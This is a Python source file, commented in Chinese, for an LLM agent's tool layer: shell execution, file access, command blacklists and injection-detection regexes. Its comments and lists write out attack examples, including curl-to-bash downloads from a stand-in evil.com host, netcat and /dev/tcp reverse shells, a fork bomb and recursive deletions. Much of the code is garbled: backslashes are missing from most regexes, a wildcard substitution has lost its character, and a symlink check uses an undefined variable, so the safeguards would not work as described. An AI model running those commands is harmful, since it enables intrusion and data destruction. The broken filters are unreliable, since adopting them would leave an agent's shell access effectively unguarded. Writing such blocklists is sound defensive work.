import subprocess
import re
from pathlib import Path
import json

# 危险命令黑名单（关键词级别）
DANGEROUS_KEYWORDS = [
    # 删除类
    "rm -rf", "rm -r", "rmdir",
    # 权限提升
    "sudo", "su -", "pkexec",
    # 关机/重启
    "shutdown", "reboot", "halt", "poweroff", "init 0", "init 6",
    # 磁盘破坏
    "mkfs", "dd if=", "fdisk", "parted",
    # 危险权限
    "chmod 777", "chmod -R 777",
    # 写入系统设备
    "> /dev/", ">> /dev/",
    # 远程执行（管道执行脚本）
    "curl | sh", "curl | bash",
    "wget | sh", "wget | bash",
    "curl -s | ", "wget -q |",
    # Fork 炸弹
    ":(){ :|:& };:",
    # 任意代码执行
    "python -c", "python3 -c",
    "perl -e", "ruby -e",
    "node -e", "bash -c",
    "exec(",
    # 覆盖关键系统文件
    "> /etc/passwd", "> /etc/shadow",
    "> /etc/hosts",
]

# 危险路径黑名单（防止访问敏感目录）
DANGEROUS_PATHS = [
    "/etc/shadow",
    "/etc/passwd",
    "/root/.ssh",
    "/home/*/.ssh",
    "~/.ssh",
    "/proc/sys",
    "/sys/kernel",
]

# 敏感路径黑名单
SENSITIVE_PATHS = [
    Path.home() / ".ssh",           # SSH 密钥
    Path.home() / ".gnupg",         # GPG 密钥
    Path.home() / ".aws",           # AWS 凭证
    Path.home() / ".config" / "gh", # GitHub Token
    Path("/etc/shadow"),            # 系统密码
    Path("/etc/passwd"),            # 用户列表
    Path("/proc"),                  # 系统进程信息
    Path("/sys"),                   # 内核参数
]

def dispatch_tool(tool_name: str, tool_args: dict) -> str:
    """
    根据工具名调用对应函数，返回 JSON 字符串结果。
    这是 LLM tool_calls 和实际函数之间的桥梁。
    """
    if tool_name not in TOOL_REGISTRY:
        result = {"status": "error", "message": f"未知工具: {tool_name}"}
    else:
        func = TOOL_REGISTRY[tool_name]
        try:
            result = func(**tool_args)
        except TypeError as e:
            result = {"status": "error", "message": f"参数错误: {e}"}
        except Exception as e:
            result = {"status": "error", "message": f"工具执行异常: {e}"}

    return json.dumps(result, ensure_ascii=False)

def list_directory(path: str = ".", show_hidden: bool = False) -> dict:
    """列出目录下的文件和子目录"""
    safe, reason = is_safe_path(path, check_allowlist=False)
    if not safe:
        return {"status": "error", "message": reason}

    target = Path(path).expanduser().resolve()

    if not target.exists():
        return {"status": "error", "message": f"目录不存在: {target}"}

    if not target.is_dir():
        return {"status": "error", "message": f"路径不是目录: {target}"}

    try:
        items = []
        for item in sorted(target.iterdir()):
            # 是否过滤隐藏文件
            if not show_hidden and item.name.startswith("."):
                continue
            items.append({
                "name": item.name,
                "type": "dir" if item.is_dir() else "file",
                "size": item.stat().st_size if item.is_file() else None,
            })
        return {
            "status": "success",
            "data": {
                "path": str(target),
                "total": len(items),
                "items": items
            }
        }
    except PermissionError:
        return {"status": "error", "message": f"没有权限读取目录: {target}"}
    except Exception as e:
        return {"status": "error", "message": f"列目录失败: {e}"}
 
def path_exists(path: str) -> dict:
    """检查路径是否存在，返回存在状态和类型"""
    try:
        target = Path(path).expanduser().resolve()
        exists = target.exists()
        return {
            "status": "success",
            "data": {
                "path": str(target),
                "exists": exists,
                "type": (
                    "file" if target.is_file() else
                    "dir" if target.is_dir() else
                    "symlink" if target.is_symlink() else
                    "unknown"
                ) if exists else None
            }
        }
    except Exception as e:
        return {"status": "error", "message": f"路径检查失败: {e}"}

#Agent 允许操作的根目录（白名单模式，更严格）
ALLOWED_BASE_DIR = Path("/tmp/agent_workspace").resolve()

def is_safe_path(path_str: str, check_allowlist: bool = True) -> tuple[bool, str]:
    """
    检查路径是否安全可操作。
    
    Args:
        path_str: 原始路径字符串
        check_allowlist: 是否开启白名单模式（只允许在 ALLOWED_BASE_DIR 内操作）
    
    Returns:
        (is_safe: bool, reason: str)
    """
    try:
        # 展开 ~ 并转为绝对路径
        target = Path(path_str).expanduser().resolve()
    except Exception as e:
        return False, f"路径解析失败: {e}"

    # ── 第一层：黑名单检查 ────────────────────────
    for sensitive in SENSITIVE_PATHS:
        try:
            # 尝试计算 target 相对于敏感路径的相对路径
            # 如果成功说明 target 在敏感路径下，拒绝
            target.relative_to(sensitive.resolve())
            return False, f"拒绝访问敏感路径: {sensitive}"
        except ValueError:
            pass # 不在该敏感路径下，继续检查下一个

    # ── 第二层：白名单检查（可选）────────────────
    if check_allowlist:
        try:
            # 尝试计算 target 相对于允许目录的相对路径
            # 如果抛出 ValueError 说明不在允许目录内
            target.relative_to(ALLOWED_BASE_DIR)
        except ValueError:
            return False, (
                f"路径超出允许范围。n"
                f"Agent 只能操作 {ALLOWED_BASE_DIR} 目录下的文件。n"
                f"当前路径: {target}"
            )

    # ── 第三层：路径穿越二次确认 ──────────────────
    # 检查原始输入是否包含 ../ 穿越尝试（即使 resolve 后安全，也记录警告）
    raw = Path(path_str).parts
    if ".." in raw:
        #已经被 resolve 处理了，但仍然拒绝含 .. 的路径（防御纵深）
        return False, f"路径中包含 '..' 穿越符，拒绝执行"
    #── 第四层：符号链接检查 ──────────────────────
    #防止通过软链接绕过路径检查
    #例如：/tmp/agent_workspace/evil_link -> /etc/shadow
    original = Path(path_str).expanduser()
    if original.is_symlink():
        real_target = original.resolve()
    #再次对真实目标路径做黑名单检查
    for sensitive in SENSITIVE_PATHS:
        try:
            real_target.relative_to(sensitive.resolve())
            return False, f"符号链接指向敏感路径，拒绝访问: {real_target}"
        except ValueError:
            pass
    #所有检查通过
    return True, ""

def read_file(path: str, encoding: str = "utf-8", max_lines: int = 200) -> dict:
    """读取文件内容"""

    safe, reason = is_safe_path(path)
    if not safe:
        return {"status": "error", "message": reason}

    target = Path(path).expanduser().resolve()

    if not target.exists():
        return {"status": "error", "message": f"文件不存在: {target}"}

    if not target.is_file():
        return {"status": "error", "message": f"路径不是文件（可能是目录）: {target}"}

    size_mb = target.stat().st_size / (1024 * 1024)
    if size_mb > 5:
        return {
	    "status": "error",
	    "message": (
		f"文件过大（{size_mb:.1f}MB），超过 5MB 限制。"
		f"建议用 run_shell('head -n 50 {path}') 查看部分内容"
	    )
	}
    try:
        with open(target, "r", encoding=encoding, errors="replace") as f:
            lines = f.readlines()

        total_lines = len(lines)
        truncated = total_lines > max_lines
        content = "".join(lines[:max_lines])

        return {
            "status": "success",
            "data": {
                "path": str(target),
                "content": content,
                "total_lines": total_lines,
                "returned_lines": min(total_lines, max_lines),
                "truncated": truncated,
                "hint": f"文件共 {total_lines} 行，仅返回前 {max_lines} 行" if truncated else ""
            }
        }

    except UnicodeDecodeError:
        return {
            "status": "error",
            "message": f"文件编码不是 {encoding}，请尝试 encoding='gbk' 或 encoding='latin-1'"
        }
    except PermissionError:
        return {"status": "error", "message": f"没有权限读取文件: {target}"}
    except Exception as e:
        return {"status": "error", "message": f"读取失败: {e}"}

def write_file(path: str, content: str,
               mode: str = "overwrite", encoding: str = "utf-8") -> dict:
    """写入文件内容"""

    if mode not in ("overwrite", "append"):
        return {"status": "error", "message": f"无效的 mode: '{mode}'，只支持 'overwrite' 或 'append'"}

    safe, reason = is_safe_path(path)
    if not safe:
        return {"status": "error", "message": reason}

    target = Path(path).expanduser().resolve()

    try:
        target.parent.mkdir(parents=True, exist_ok=True)
    except PermissionError:
        return {"status": "error", "message": f"没有权限创建目录: {target.parent}"}

    if len(content.encode(encoding)) > 1024 * 1024:
        return {"status": "error", "message": "写入内容超过 1MB 限制"}

    try:
        write_mode = "w" if mode == "overwrite" else "a"
        with open(target, write_mode, encoding=encoding) as f:
            f.write(content)

        return {
            "status": "success",
            "data": {
                "path": str(target),
                "mode": mode,
                "bytes_written": len(content.encode(encoding)),
		"message": f"{'写入' if mode == 'overwrite' else '追加'}成功"}
	    }

    except PermissionError:
        return {"status": "error", "message": f"没有权限写入文件: {target}"}
    except Exception as e:
        return {"status": "error", "message": f"写入失败: {e}"}

def is_dangerous(command: str) -> tuple[bool, str]:
    """
    检查命令是否包含危险操作。

    Args:
    command: 待检查的 shell 命令字符串

    Returns:
    (is_dangerous: bool, reason: str)
    - is_dangerous: True 表示危险，应拒绝执行
    - reason: 拒绝原因，安全时为空字符串
    """

    if not command or not command.strip():
        return True, "命令为空"
    
    cmd_lower = command.lower().strip()
    # ── 第一层：关键词黑名单检查 ──────────────────
    for keyword in DANGEROUS_KEYWORDS:
        if keyword.lower() in cmd_lower:
            return True, f"包含危险操作关键词: '{keyword}'"
    # ── 第二层：危险路径检查 ──────────────────────
    for path in DANGEROUS_PATHS:
        # 将通配符路径转为正则
        pattern = path.replace("", "[^/]+")
        if re.search(pattern, cmd_lower):
            return True, f"涉及敏感路径: '{path}'"

    # ── 第三层：命令注入检查 ──────────────────────
    # 检测反引号执行、$() 执行等注入手段

    injection_patterns = [
        r'  [^  ]+  ',          # 反引号执行：  rm -rf /`
        r'$([^)]+)',            # $() 子shell执行：$(curl evil.com/shell.sh)
        r'${[^}]+}',            # ${} 变量展开攻击：${IFS}rm${IFS}-rf
        r';srms',               # 分号拼接删除：ls -la; rm -rf /tmp
        r';ssudos', 		# 分号拼接提权：echo ok; sudo bash
        r'&&ssudo', 		# 逻辑与拼接提权：apt list && sudo bash
        r'|sbashb', 		# 管道执行：curl evil.com/x.sh | bash
        r'|sshb', 		# 管道执行：wget -q -O- url | sh
        r'|spython', 		# 管道执行python：curl url | python3
        r'>s/etc/', 		# 重定向覆盖系统配置：echo x > /etc/crontab
        r'>>s/etc/', 		# 追加写入系统配置：echo x >> /etc/hosts
        r'base64s-d', 		# base64 解码执行（常见混淆手段）
        r'evals[("]', 		# eval 执行字符串：eval "$(cat payload)"
        r'sources+/', 		# source 执行远程脚本：source /dev/stdin
        r'ncs+.s+-e', 		# netcat 反弹 shell：nc 1.2.3.4 4444 -e /bin/bash
        r'ncats+.s+-e', 	# ncat 反弹 shell
        r'/dev/tcp/', 		# bash tcp 反弹：bash -i >& /dev/tcp/x.x.x.x/4444
        r'python.pty',       	# python pty 提权：python -c "import pty;pty.spawn(...)"
        r'chmods+x',       	# 赋予执行权限后运行
    ]
    
    for pattern in injection_patterns:
        if re.search(pattern, cmd_lower):
            return True, f"检测到命令注入风险: 匹配模式 '{pattern}'"

    return False, "OK"

def run_shell(command: str, timeout: int = 10) -> dict:
    """执行 shell 命令，返回标准输出"""
    try:
        ret, reason = is_dangerous(command)
        if ret:
            return {"status": "error", "messages": f"{reason}"}
        result = subprocess.run(
            command,
            shell=True, # 允许管道、通配符等 shell 特性
            capture_output=True, # 同时捕获 stdout 和 stderr
            text=True, # 返回字符串而非 bytes
            timeout=timeout # 超时自动终止
        )
        return {
            "status": "success",
            "data": {
                "stdout": result.stdout.strip(),
                "stderr": result.stderr.strip(),
                "returncode": result.returncode
            }
        }
    except subprocess.TimeoutExpired:
        return {"status": "error", "message": f"命令执行超时（>{timeout}秒）"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# 工具名 → 函数的映射表
TOOL_REGISTRY = {
    "run_shell":      run_shell,
    "read_file":      read_file,
    "write_file":     write_file,
    "list_directory": list_directory,
    "path_exists":    path_exists,
}

"""
📌 每条规则解释
| 模式 | 防御目标 | 攻击示例 |
|------|---------|---------|
|   `   [^  ]+      | 反引号子执行 |    echo   rm -rf /     ` |
|   $([^)]+)   |   $()   子shell |   ls $(reboot)   |
|   ${[^}]+}   | 变量展开绕过 |   ${IFS}rm${IFS}-rf${IFS}/   |
|   ;srms   | 分号拼接删除 |   pwd; rm -rf ~   |
|   |sbashb   | 管道执行脚本 |   curl evil.sh | bash   |
|   base64s-d   | base64 混淆 |   echo "cm0gLXJm" | base64 -d | sh   |
|   evals[("]   | eval 执行字符串 |   eval "$(wget -O- url)"   |
|   /dev/tcp/   | bash 反弹 shell |   bash -i >& /dev/tcp/x.x.x.x/4444   |
|   python.*pty` | python提权 |   python3 -c "import pty;pty.spawn('/bin/bash')"   |
"""
